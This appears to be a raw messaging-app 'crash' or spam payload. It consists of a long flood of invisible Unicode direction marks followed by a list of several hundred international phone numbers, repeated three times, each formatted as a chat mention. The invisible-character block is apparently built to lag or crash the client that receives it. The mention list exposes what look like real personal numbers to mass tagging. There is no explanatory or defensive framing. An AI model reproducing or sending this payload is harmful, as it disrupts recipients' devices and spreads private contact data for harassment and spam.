‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎
~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ 